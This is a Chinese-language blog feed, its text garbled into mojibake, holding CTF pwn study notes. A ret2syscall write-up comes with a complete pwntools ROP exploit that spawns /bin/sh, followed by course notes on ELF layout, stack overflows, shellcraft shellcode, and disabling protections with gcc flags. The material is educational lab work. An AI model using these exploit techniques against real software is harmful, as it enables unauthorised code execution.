</p><p>è¿™åˆæ˜¯ä¸€é“åŠ¨æ€è°ƒè¯•å’Œé™æ€åˆ†æç»“æœä¸ç›¸åŒå¾—ä¸€é“é¢˜ã€‚ç»“æœéœ€è¦æ³¨å…¥ï¼ˆ0x88-0x1c+4ï¼‰çš„åƒåœ¾æ•°æ®</p><h5 id="æ„å»ºpayloadï¼Œç¼–å†™exp"><a href="#æ„å»ºpayloadï¼Œç¼–å†™exp" class="headerlink" title="æ„å»ºpayloadï¼Œç¼–å†™exp"></a>æ„å»ºpayloadï¼Œç¼–å†™exp</h5><p><code>flat</code> æ˜¯ <code>pwntools</code> æä¾›çš„å¦ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†ä¼ å…¥çš„åˆ—è¡¨å±•å¹³ä¸ºä¸€ä¸ªè¿ç»­çš„å­—èŠ‚ä¸²ã€‚å®ƒä¼šå°†åˆ—è¡¨ä¸­çš„å…ƒç´ ï¼ˆæ¯”å¦‚å­—èŠ‚ä¸²ã€æ•´æ•°ç­‰ï¼‰æŒ‰é¡ºåºç»„åˆæˆä¸€ä¸ªè¿ç»­çš„å†…å­˜å—ã€‚</p><p><code>payload = flat([b&#39;A&#39;*(112),pop_eax_addr, 0xb , pop_edx_ecx_ebx_addr, 0 , 0 , 0x80be408, int80_addr])</code></p><p>ä»¥ä¸‹ä¸ºexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">int80_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*(<span class="number">112</span>), pop_eax_addr , <span class="number">0xb</span>,pop_edx_ecx_ebx_addr, <span class="number">0</span>,<span class="number">0</span>,binsh, int80_addr])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnå­¦ä¹ </title>
      <link href="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><blockquote><p>æ¥æºï¼š</p><p>[0002.å“”å“©å“”å“©-ã€ä¸ªäººå‘ã€‘CTF pwn å…¥é—¨-P2<a href="https://www.bilibili.com/video/BV1854y1y7Ro?vd_source=73decf7c030f3abfceb81f802abd8fd0&p=2&spm_id_from=333.788.videopod.episodes">é«˜æ¸…ç‰ˆ]_å“”å“©å“”å“©_bilibili</a></p></blockquote><h1 id="PPTé“¾æ¥"><a href="#PPTé“¾æ¥" class="headerlink" title="PPTé“¾æ¥"></a>PPTé“¾æ¥</h1><p><a href="https://onedrive.live.com/edit.aspx?resid=4465402B41B4B710!seb0e4dd0494f4f52bef5c10a8eed95ec">PWN.pptx - Microsoft PowerPoint Online</a></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116150330270.png" alt="image 20241116150330270"></p><h1 id="ç¬¬ä¸€èŠ‚ï¼šå¯æ‰§è¡Œæ–‡ä»¶ã€ELFæ–‡ä»¶ç»“æ„"><a href="#ç¬¬ä¸€èŠ‚ï¼šå¯æ‰§è¡Œæ–‡ä»¶ã€ELFæ–‡ä»¶ç»“æ„" class="headerlink" title="ç¬¬ä¸€èŠ‚ï¼šå¯æ‰§è¡Œæ–‡ä»¶ã€ELFæ–‡ä»¶ç»“æ„"></a>ç¬¬ä¸€èŠ‚ï¼šå¯æ‰§è¡Œæ–‡ä»¶ã€ELFæ–‡ä»¶ç»“æ„</h1><p>æ¢è®¨ä»test.cåˆ°a.outçš„è¿‡ç¨‹ã€‚ç ”ç©¶ä¸€ä¸‹a.outçš„ç»“æ„</p><h1 id="ç¬¬äºŒèŠ‚ï¼šç¨‹åºè£…è½½å’Œè¿è¡Œå†…å­˜"><a href="#ç¬¬äºŒèŠ‚ï¼šç¨‹åºè£…è½½å’Œè¿è¡Œå†…å­˜" class="headerlink" title="ç¬¬äºŒèŠ‚ï¼šç¨‹åºè£…è½½å’Œè¿è¡Œå†…å­˜"></a>ç¬¬äºŒèŠ‚ï¼šç¨‹åºè£…è½½å’Œè¿è¡Œå†…å­˜</h1><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116150619921.png" alt="image-20241116150619921"></p><p>èŠ‚è§†å›¾æ˜¯æ”¾åœ¨ç£ç›˜ä¸­åˆ’åˆ†åŠŸèƒ½çš„ï¼Œæ®µè§†å›¾æ˜¯ç¨‹åºè£…è½½åˆ°å†…å­˜ä¸­æ¥åˆ’åˆ†ä¸åŒè¯»å†™æƒé™çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116151250348.png" alt="image-20241116151250348"></p><p><strong>çœ‹å›¾è¯´è¯ï¼š</strong></p><blockquote><p>[IMPORTANT]</p><p><strong>æƒé™ç›¸åŒçš„èŠ‚å½’åœ¨ä¸€èµ·æˆäº†æ®µã€‚</strong></p></blockquote><p>è¿™ä¸ª<strong>åˆå¹¶</strong>çš„è¿‡ç¨‹æ˜¯ç”± <code>Linker</code> æ¥å®Œæˆçš„</p><p>ä»ELFæ–‡ä»¶åˆ°è™šæ‹Ÿå†…å­˜ç©ºé—´è¿™ä¸ª<strong>æ˜ å°„è¿‡ç¨‹</strong>æ˜¯ç”±æ“ä½œç³»ç»Ÿï¼ˆ<code>OS</code>ï¼‰æ¥å®Œæˆçš„    ï¼ˆæ‰€ä»¥ä¸Šå›¾ä»…ä¾›Linuxå‚è€ƒï¼‰</p><p>å›¾ä¸­å‘ç°ï¼Œ.rodataè¿™ä¸ªæ•°æ®èŠ‚è¢«åˆ’åˆ†åˆ°äº†Codeæ®µä¸­ã€‚è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿâ€”â€”åªä¾æ®æƒé™åˆ’åˆ†</p><p>å¯æ‰§è¡Œç¨‹åºå†…å®¹åªå äº†<strong>ä¸€éƒ¨åˆ†å†…å­˜åŒºåŸŸ</strong>ã€‚å·¦è¾¹çš„ELFæ–‡ä»¶ï¼Œå®é™…ä¸Šåªæœ‰å³è¾¹çš„Dataå’ŒCodeä¸¤ä¸ªå°é•¿æ–¹å½¢ã€‚å…¶ä»–æ˜¯ä»€ä¹ˆåé¢å†è¯´</p><p>åœ°å€ä»¥å­—èŠ‚ç¼–ç ï¼Œå¸¸ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºã€‚</p><p>è™šæ‹Ÿå†…å­˜<strong>ç”¨æˆ·ç©ºé—´</strong>æ¯ä¸ªè¿›ç¨‹ä¸€ä»½</p><p>è™šæ‹Ÿå†…å­˜<strong>å†…æ ¸ç©ºé—´</strong>æ‰€æœ‰è¿›ç¨‹å…±äº«ä¸€ä»½</p><p>è™šæ‹Ÿå†…å­˜mmapæ®µä¸­çš„<strong>åŠ¨æ€é“¾æ¥åº“</strong>ä»…åœ¨ç‰©ç†å†…å­˜ä¸­è£…è½½ä¸€ä»½</p><h5 id="è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆè™šæ‹Ÿå†…å­˜ï¼‰å’Œç‰©ç†å†…å­˜"><a href="#è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆè™šæ‹Ÿå†…å­˜ï¼‰å’Œç‰©ç†å†…å­˜" class="headerlink" title="è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆè™šæ‹Ÿå†…å­˜ï¼‰å’Œç‰©ç†å†…å­˜"></a>è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆè™šæ‹Ÿå†…å­˜ï¼‰å’Œç‰©ç†å†…å­˜</h5><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116153505516.png" alt="image-20241116153505516" style="zoom: 50%;"><p>x86-LInuxï¼ˆ32ä½çš„è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ï¼‰    ä¸€å…±4GBï¼ˆæ•´ä¸ª4GBå¯¹åº”å†…å­˜ä¸­çš„ELFï¼‰</p><p>ç”¨æˆ·ç©ºé—´åˆ†3GBï¼Œ1GBå…±äº«å†…æ ¸ç©ºé—´ã€‚ï¼ˆèŠ‚çœèµ„æºçš„ç›®çš„ï¼‰ </p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116154309783.png" alt="image-20241116154309783" style="zoom:50%;"><p>å¦‚æœæ˜¯64ä½è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œåœ°å€çš„æœ‰æ•ˆä½å…¶å®æ˜¯6ä¸ªå­—èŠ‚ã€‚å› ä¸ºè¿™è¶³å¤Ÿå¤§äº†</p><h5 id="æ®µä¸èŠ‚"><a href="#æ®µä¸èŠ‚" class="headerlink" title="æ®µä¸èŠ‚"></a>æ®µä¸èŠ‚</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116231329387.png" alt="image-20241116231329387"></p><p>textèŠ‚å°±æ˜¯æˆ‘ä»¬çš„ä¸»ç¨‹åº</p><p>ä¸€ä¸ªæ®µæ˜¯èŠ‚çš„<strong>é«˜å±‚æ¬¡</strong>ã€‚</p><p>æ®µè§†å›¾ç”¨äºè¿›ç¨‹çš„å†…å­˜åŒºåŸŸçš„rwx<strong>æƒé™åˆ’åˆ†</strong></p><p>èŠ‚è§†å›¾ç”¨äºELFæ–‡ä»¶ç¼–è¯‘é“¾æ¥æ—¶ä¸ç£ç›˜ä¸Šå­˜å‚¨çš„æ–‡ä»¶ç»“æ„çš„ç»„ç»‡</p><h5 id="ä¸¾ä¸ªä¾‹å­"><a href="#ä¸¾ä¸ªä¾‹å­" class="headerlink" title="ä¸¾ä¸ªä¾‹å­"></a>ä¸¾ä¸ªä¾‹å­</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116232159290.png" alt="image-20241116232159290"></p><p><code>glb</code>ä½œä¸ºæ²¡æœ‰èµ‹åˆå€¼çš„å…¨å±€å˜é‡ï¼Œä¸å ç£ç›˜ç©ºé—´ä½†å ç”±å†…å­˜ç©ºé—´ã€‚å‚¨å­˜åœ¨Bssä¸­</p><p><code>â€œHello Worldâ€</code>è™½ç„¶æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² å¸¸é‡ï¼Œä½†æ˜¯åœ¨<code>Text</code>æ®µä¸­ï¼ˆä¸€èˆ¬è®¤ä¸ºè¿™æ˜¯ä»£ç æˆåˆ†ï¼‰ã€‚è¿™æ˜¯å› ä¸ºå®ƒåªæœ‰å¯è¯»æ€§ï¼Œå±äºTextæ®µä¸­çš„<code>.rodata</code>èŠ‚</p><p>å‡½æ•°è¢«ç¼–è¯‘åè¿˜æ˜¯æ•°æ®ï¼Œæ•°æ®æ˜¯è¢«ç”¨æ¥æ‰§è¡Œçš„ä»£ç ã€‚æ—¢ç„¶æ˜¯ä»£ç æ®µï¼Œæ‰€ä»¥åœ¨Textæ®µã€‚</p><p>å‡½æ•°è°ƒç”¨åœ¨æ ˆä¸­</p><p>å±€éƒ¨å˜é‡ptråœ¨æ ˆä¸­</p><p>mallocç”³è¯·çš„ç©ºé—´åœ¨å †ä¸­</p><p>x,yåœ¨å“ªå„¿ä¸ç³»ç»Ÿæ¶æ„æœ‰å…³ã€‚AMD64åœ¨å¯„å­˜å™¨ï¼Œx86åœ¨æ ˆ</p><h1 id="ç¬¬ä¸‰èŠ‚ï¼šCPUä¸è¿›ç¨‹çš„æ‰§è¡Œ"><a href="#ç¬¬ä¸‰èŠ‚ï¼šCPUä¸è¿›ç¨‹çš„æ‰§è¡Œ" class="headerlink" title="ç¬¬ä¸‰èŠ‚ï¼šCPUä¸è¿›ç¨‹çš„æ‰§è¡Œ"></a>ç¬¬ä¸‰èŠ‚ï¼šCPUä¸è¿›ç¨‹çš„æ‰§è¡Œ</h1><p> <img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116233739080.png" alt="image-20241116233739080"></p><p>CPUé€šè¿‡æ€»çº¿å‘å†…å­˜å‘é€è®¿å­˜æŒ‡ä»¤ã€‚</p><h1 id="ç¬¬å››èŠ‚ï¼šè£…è½½ä¸æ±‡ç¼–"><a href="#ç¬¬å››èŠ‚ï¼šè£…è½½ä¸æ±‡ç¼–" class="headerlink" title="ç¬¬å››èŠ‚ï¼šè£…è½½ä¸æ±‡ç¼–"></a>ç¬¬å››èŠ‚ï¼šè£…è½½ä¸æ±‡ç¼–</h1><p>æ±‡ç¼–è¿™ä¸ªï¼Œè¯¾å ‚ä»»åŠ¡ï¼Œæ‡’å¾—å†™</p><p>è£…è½½è¿™ä¸ªï¼Œæ²¡å­¦ä¼šï¼Œå†™ä¸å‡ºæ¥</p><h1 id="ç¬¬äº”èŠ‚ï¼šæ ˆæº¢å‡ºåŸºç¡€"><a href="#ç¬¬äº”èŠ‚ï¼šæ ˆæº¢å‡ºåŸºç¡€" class="headerlink" title="ç¬¬äº”èŠ‚ï¼šæ ˆæº¢å‡ºåŸºç¡€"></a>ç¬¬äº”èŠ‚ï¼šæ ˆæº¢å‡ºåŸºç¡€</h1><h3 id="å‡½æ•°è°ƒç”¨æ ˆ"><a href="#å‡½æ•°è°ƒç”¨æ ˆ" class="headerlink" title="å‡½æ•°è°ƒç”¨æ ˆ"></a>å‡½æ•°è°ƒç”¨æ ˆ</h3><p>ç ”ç©¶çš„æ˜¯x86å—·</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117141336080.png" alt="image-20241117141336080" style="zoom: 67%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117141635096.png" alt="image-20241117141635096" style="zoom: 67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117143029165.png" alt="image-20241117143029165" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117143135103.png" alt="image-20241117143135103" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117143257088.png" alt="image-20241117143257088" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117143429165.png" alt="image-20241117143429165" style="zoom:50%;"></p><p>å‡½æ•°çŠ¶æ€ä¸»è¦æ¶‰åŠä¸‰ä¸ªå¯„å­˜å™¨â€”â€”<code>esp</code>ã€<code>ebp</code>ã€<code>eip</code>ã€‚</p><p><code>esp</code><strong>ç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€</strong>ï¼Œåœ¨å‹æ ˆå’Œé€€æ ˆçš„æ—¶å€™å‘ç”Ÿå˜åŒ–ã€‚</p><p><code>ebp</code><strong>ç”¨æ¥å­˜å‚¨å½“å‰å‡½æ•°çŠ¶æ€çš„åŸºåœ°å€</strong>ï¼Œåœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜ï¼Œå¯ä»¥ç”¨æ¥ç´¢å¼•ç¡®å®šå‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½®ã€‚</p><p><code>eip</code><strong>ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€</strong>ï¼Œcpuä¾ç…§eipçš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œeipéšä¹‹æŒ‡å‘ç›¸é‚»çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117140052263.png" alt="image-20241117140052263"></p><p><code>return address</code>ï¼šè¿”å›åœ°å€</p><p><code>stack frame pointer</code>ï¼š<strong>ä¸Šä¸€ä¸ªæ ˆå¸§çš„æ ˆé¡¶</strong>ï¼ˆebpï¼‰çš„å€¼ã€‚æ–¹ä¾¿æ¢å¤çˆ¶å‡½æ•°çš„æ ˆé¡¶æŒ‡é’ˆ</p><p><code>local variables</code>ï¼š<strong>å±€éƒ¨å˜é‡</strong></p><p><code>arguments</code>ï¼šå­å‡½æ•°æ‰€ç”¨åˆ°çš„<strong>å½¢å‚</strong>ã€‚ å­å‡½æ•°ä¿å­˜çš„å‚æ•°å®é™…ä¸Šåœ¨çˆ¶å‡½æ•°æ ˆå¸§çš„æœ«å°¾ã€‚</p><p>èƒ½çœ‹å‡ºæ¥å—ï¼Œå›¾ä¸­çš„ä¾‹å­æ˜¯ä¸ªå¾ªç¯ç»“æ„</p><h5 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241118100801676.png" alt="image-20241118100801676"></p><p>è¯•è¯•çœ‹èƒ½ä¸èƒ½åœ¨æ²¡æœ‰è®²è§£çš„æƒ…å†µä¸‹æ‹å®Œæ•´ä¸ªè¿‡ç¨‹ã€‚</p><p>ä¸è¡Œçœ‹PPTå»</p><p><strong>mainå‡½æ•°çš„æ ˆå¸§æ˜¯ç¬¬ä¸€ä¸ªæ ˆå¸§ï¼Œåœ¨æ­¤ä¹‹å‰è¿è¡Œçš„å‡½æ•°æ˜¯æ²¡æœ‰æ ˆå¸§çš„</strong></p><h3 id="æ ˆæº¢å‡ºæ”»å‡»"><a href="#æ ˆæº¢å‡ºæ”»å‡»" class="headerlink" title="æ ˆæº¢å‡ºæ”»å‡»"></a>æ ˆæº¢å‡ºæ”»å‡»</h3><p>è¦å¾—åˆ°shellï¼Œå°±è¦æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ</p><p>è¦æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµï¼Œå°±è¦æ§åˆ¶PCå¯„å­˜å™¨</p><p>è¦æ§åˆ¶PCå¯„å­˜å™¨ï¼Œå°±è¦æ§åˆ¶èƒ½ä¸ºPCå¯„å­˜å™¨èµ‹å€¼çš„æ•°æ®</p><p>ä¹Ÿå°±æ˜¯è¦<strong>æ§åˆ¶å­å‡½æ•°è¿”å›çˆ¶å‡½æ•°çš„ return address</strong></p><p>æ ˆæº¢å‡ºæ˜¯<strong>ç¼“å†²åŒºæº¢å‡º</strong>çš„ä¸€ç§ã€‚</p><p>ç¼“å†²åŒºæº¢å‡ºçš„æœ¬è´¨æ˜¯å‘<strong>å®šé•¿çš„ç¼“å†²åŒº</strong>å†™å…¥äº†<strong>è¶…é•¿çš„æ•°æ®</strong>ï¼Œé€ æˆè¶…å‡ºçš„æ•°æ®è…¹æ³»äº†åˆæ³•å†…å­˜åŒºåŸŸ</p><p>ç¼“å†²åŒºæº¢å‡ºåˆ†ä¸º<strong>æ ˆæº¢å‡º</strong>ã€<strong>å †æº¢å‡º</strong>å’Œ<strong>BSSæº¢å‡º</strong>ä¸‰ç§</p><h5 id="ä¾‹å­-1"><a href="#ä¾‹å­-1" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241118103900450.png" alt="image-20241118103900450"></p><h1 id="ç¬¬å…­èŠ‚ï¼šç†Ÿç»ƒä½¿ç”¨å·¥å…·"><a href="#ç¬¬å…­èŠ‚ï¼šç†Ÿç»ƒä½¿ç”¨å·¥å…·" class="headerlink" title="ç¬¬å…­èŠ‚ï¼šç†Ÿç»ƒä½¿ç”¨å·¥å…·"></a>ç¬¬å…­èŠ‚ï¼šç†Ÿç»ƒä½¿ç”¨å·¥å…·</h1><p>ä¸€åˆ‡çš„å¼€ç«¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./æ–‡ä»¶å&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;IP&quot;</span>,Port)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241120202629020.png" alt="image-20241120202629020"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recv()//è¯»å–å…¨éƒ¨è¾“å‡º</span><br><span class="line"></span><br><span class="line">io.recvline()//è¯»å–ä¸€è¡Œè¾“å‡º</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241120202840185.png" alt="image-20241120202840185"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(p64<span class="string">&quot;15&quot;</span>)//è‡ªå¸¦æ¢è¡Œã€‚è‹¥æ˜¯<span class="number">32</span>ä½æ•´æ•°åˆ™æ˜¯p32</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&quot;135asdf\n&quot;</span>)//sendåªèƒ½å‘é€äºŒè¿›åˆ¶æ•°æ®ã€‚</span><br></pre></td></tr></table></figure><h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h5><p>g  è·³è½¬åˆ°æŒ‡å®šåœ°å€</p><h5 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h5><p>run è¿è¡Œ</p><p>r</p><p>b ï¼ˆbreak pointï¼‰     b mainå³è¿è¡Œå®Œä¸»å‡½æ•°</p><p>n  è¿›è¡Œä¸‹ä¸€æ­¥</p><p>vmmap</p><p>æ³¨æ„gdbæ˜¯ç”¨ä¸€ç§ç‰¹æ®Šçš„æ–¹å¼æ¥è¿›è¡Œçš„è¿›ç¨‹æ˜ åƒï¼Œæ‰€ä»¥gdbçš„æ ˆåœ°å€ï¼ˆå¾ˆå¤§æ¦‚ç‡ï¼‰ä¸ä¸€å®šæ˜¯å¯é çš„åœ°å€ã€‚</p><p>ä½†æ˜¯gdbä¸­çœ‹åˆ°çš„åç§»ä¸€å®šæ˜¯å¯é çš„</p><p>ç›¸æ¯”IDA ä¸­çœ‹åˆ°çš„åç§»ä¸ä¸€å®šå¯é </p><h5 id="æœºå™¨ç "><a href="#æœºå™¨ç " class="headerlink" title="æœºå™¨ç "></a>æœºå™¨ç </h5><p><code>shellcraft</code></p><p><code>shellcraft.sh()</code> è¾“å‡ºæ±‡ç¼–ä»£ç </p><p><code>printï¼ˆshellcraft.sh() ï¼‰</code>  è¿™æ˜¯æˆ‘ä»¬è¦çš„shellcode</p><p><code>print(asm(shellcraft.sh()))</code> è½¬åŒ–ä¸ºæœºå™¨ç </p><p>ä»¥ä¸Šæ˜¯32ä½</p><p>å¦‚æ˜¯64ä½</p><p><code>shellcraft.amd64.sh()</code></p><p>ä¸è¿‡æœ€å¥½å…ˆåŠ ä¸Š <code>context.arch = &quot;amd64&quot;</code></p><p>åˆ·é¢˜å»å§ï¼Œå†™é¢˜è§£</p><h1 id="ç¬¬ä¸ƒèŠ‚ï¼šç¨‹åºä¿æŠ¤æªæ–½"><a href="#ç¬¬ä¸ƒèŠ‚ï¼šç¨‹åºä¿æŠ¤æªæ–½" class="headerlink" title="ç¬¬ä¸ƒèŠ‚ï¼šç¨‹åºä¿æŠ¤æªæ–½"></a>ç¬¬ä¸ƒèŠ‚ï¼šç¨‹åºä¿æŠ¤æªæ–½</h1><p>ä½¿ç”¨checksecæŸ¥çœ‹</p><h4 id="ASLRï¼ˆAddress-Space-Layout-Randomizationï¼‰"><a href="#ASLRï¼ˆAddress-Space-Layout-Randomizationï¼‰" class="headerlink" title="ASLRï¼ˆAddress Space Layout Randomizationï¼‰"></a>ASLRï¼ˆAddress Space Layout Randomizationï¼‰</h4><p><strong>åœ°å€ç©ºé—´éšæœºåŒ–</strong>ã€‚</p><p>ç³»ç»Ÿçš„é˜²æŠ¤æªæ–½ï¼Œç¨‹åºè£…è½½æ—¶ç”Ÿæ•ˆã€‚æ“ä½œç³»ç»Ÿé»˜è®¤æ‰“å¼€</p><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x3D; <strong>0</strong>ï¼š<strong>æ²¡æœ‰éšæœºåŒ–</strong>ã€‚å³å…³é—­ ASLR</p><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x3D; <strong>1</strong>ï¼š<strong>ä¿ç•™çš„éšæœºåŒ–</strong>ã€‚å…±äº«åº“ã€æ ˆã€mmap() ä»¥åŠ VDSO å°†è¢«éšæœºåŒ–</p><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x3D; <strong>2</strong>ï¼š<strong>å®Œå…¨çš„éšæœºåŒ–</strong>ã€‚åœ¨randomize_va_space &#x3D; 1çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡ brk() åˆ†é…çš„å†…å­˜ç©ºé—´ä¹Ÿå°†è¢«éšæœºåŒ–</p><h4 id="The-NX-bits-the-No-eXecute-bits"><a href="#The-NX-bits-the-No-eXecute-bits" class="headerlink" title="The NX bits (the No-eXecute bits)"></a>The NX bits (the No-eXecute bits)</h4><p>æ ˆç¼“å†²åŒºä¸å¯æ‰§è¡Œ</p><p>åªè¦ä¸åº”è¯¥æ˜¯ä»£ç çš„åœ°æ–¹éƒ½ä¸æ‰§è¡Œ</p><p>æ‰€ä»¥<strong>ä¸€èˆ¬æ€è·¯å°†shellcodeå†™å…¥bss</strong>ã€‚ å†™å…¥å †å¾ˆå°‘ã€‚<del>ä½†å¬è¯´ctfå¾ˆå¤š</del></p><p><strong>bssæ˜¯ç”¨æ¥å­˜æ”¾å…¨å±€å˜é‡çš„</strong></p><h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><p>åœ¨previous ebpå‰æ”¾äº†ä¸€ä¸ªcanaryæ•°ç»„ï¼Œå†…å®¹ä¸ºéšæœºæ•°</p><p>åœ¨æ ˆå¸§é”€æ¯æ—¶ï¼ˆleaveæŒ‡ä»¤å‰ï¼‰ï¼Œä¼šæ£€æµ‹Canaryæ•°ç»„çš„å€¼æ˜¯å¦æ”¹å˜ï¼Œå¦‚æœæ”¹å˜ç¨‹åºä¼šå¯„æ‰</p><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>ç¼–è¯‘å™¨ç¼–è¯‘æ—¶æ‰“å¼€çš„å¼€å…³ï¼Œä¸ASLRåŒºåˆ†</p><p>éšæœºåŒ–Dataï¼ŒTextå’ŒBss</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241122111607229.png" alt="image-20241122111607229"></p><p>åœ¨è„šæœ¬å¤´ä¸Šå†™ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gcc -fno-stack-protector -z execstack -no-pie -g -o ret2stack ret2stack.c</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆç¨‹åºåï¼Œchecksecä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126213339533.png" alt="image-20241126213339533"></p><h1 id="ç¬¬å…«èŠ‚ï¼šè¿”å›å¯¼å‘ç¼–ç¨‹"><a href="#ç¬¬å…«èŠ‚ï¼šè¿”å›å¯¼å‘ç¼–ç¨‹" class="headerlink" title="ç¬¬å…«èŠ‚ï¼šè¿”å›å¯¼å‘ç¼–ç¨‹"></a>ç¬¬å…«èŠ‚ï¼šè¿”å›å¯¼å‘ç¼–ç¨‹</h1><p>å¤šæ¬¡ç¯¡æ”¹IPæˆæˆ‘ä»¬æƒ³è¦çš„åœ°å€çš„è¿‡ç¨‹</p><p>å’Œå‰é¢çš„æ ˆæº¢å‡ºä¸åŒçš„æ˜¯ï¼Œä»¥å‰çš„åŸºç¡€æ ˆæº¢å‡ºå¯ä»¥ä¸€æ­¥åˆ°ä½ï¼ˆå› 